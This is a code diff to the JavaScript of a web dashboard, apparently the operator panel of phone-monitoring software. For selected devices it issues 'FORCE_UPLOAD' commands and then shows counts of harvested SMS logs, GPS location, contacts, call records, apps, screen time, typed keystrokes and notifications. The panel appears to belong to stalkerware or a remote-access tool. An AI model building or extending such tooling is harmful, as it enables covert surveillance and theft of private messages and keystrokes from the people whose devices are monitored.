@@ -550,7 +550,15 @@
             document.getElementById('status-title').innerText = `CLUSTER AUDIT: ${type}`;
             document.getElementById('status-content').innerHTML = '<div style="padding:20px; text-align:center;">FETCHING CLUSTER DATA...</div>';
             document.getElementById('status-overlay').style.display = 'flex';
-            document.getElementById('status-overlay').style.display = 'flex';
+
+            let latestStats = {};
+            if (type === 'FORCE_UPLOAD') {
+                const { data: sData } = await sb.from('device_stats')
+                    .select('*')
+                    .in('device_id', Array.from(selectedDeviceIds))
+                    .order('created_at', { ascending: false });
+                if (sData) sData.forEach(s => { if(!latestStats[s.device_id]) latestStats[s.device_id] = s; });
+            }
 
             const { data: commands, error } = await sb.from('file_commands')
                 .select('*')
@@ -579,9 +587,34 @@
 
                 if (type === 'FORCE_UPLOAD') {
                     const modules = c.content.split(',').map(m => m.trim());
-                    dataHtml = `<div style="margin-top:10px; display:flex; flex-wrap:wrap; gap:5px;">` + 
-                        modules.map(m => `<span style="font-size:0.6rem; padding:2px 6px; background:rgba(0,255,157,0.1); color:var(--success); border:1px solid rgba(0,255,157,0.2); text-transform:uppercase;">${m}</span>`).join('') + 
+                    dataHtml = `<div style="margin-top:10px; display:flex; flex-wrap:wrap; gap:5px; margin-bottom:8px;">` + 
+                        modules.map(m => `<span style="font-size:0.6rem; padding:2px 6px; background:rgba(0,255,157,0.1); color:var(--success); border:1px solid rgba(0,255,157,0.2);">${m.toUpperCase()}</span>`).join('') + 
                         `</div>`;
+                    
+                    const s = latestStats[c.device_id];
+                    if (s) {
+                        dataHtml += `<div style="background:rgba(0,0,0,0.3); padding:8px; border:1px solid #222;">`;
+                        modules.forEach(m => {
+                            let val = "--";
+                            const mod = m.split(':')[0].toLowerCase();
+                            if (mod === 'sms') val = (s.sms_logs?.length || 0) + " logs";
+                            else if (mod === 'location') val = s.location_fresh ? "GPS Fixed" : (s.location_history?.length || 0) + " pts";
+                            else if (mod === 'contacts') val = (s.contacts?.length || 0) + " entries";
+                            else if (mod === 'apps') val = (s.apps?.length || 0) + " pkgs";
+                            else if (mod === 'calls') val = (s.calls?.length || 0) + " calls";
+                            else if (mod === 'usage') val = (s.screen_time_minutes || 0) + "m screen";
+                            else if (mod === 'typing') val = (s.typing_history?.length || 0) + " keys";
+                            else if (mod === 'notifications') val = (s.notif_history?.length || 0) + " alerts";
+                            else if (mod === 'vitals') val = (s.battery_level || 0) + "%";
+                            else if (mod === 'all') val = "Full Sync";
+
+                            dataHtml += `<div style="font-size:0.65rem; color:#666; display:flex; justify-content:space-between; margin-bottom:2px;">
+                                <span>${mod.toUpperCase()}</span>
+                                <span style="color:var(--primary)">${val}</span>
+                            </div>`;
+                        });
+                        dataHtml += `</div>`;
+                    }
                 }
 
                 return `
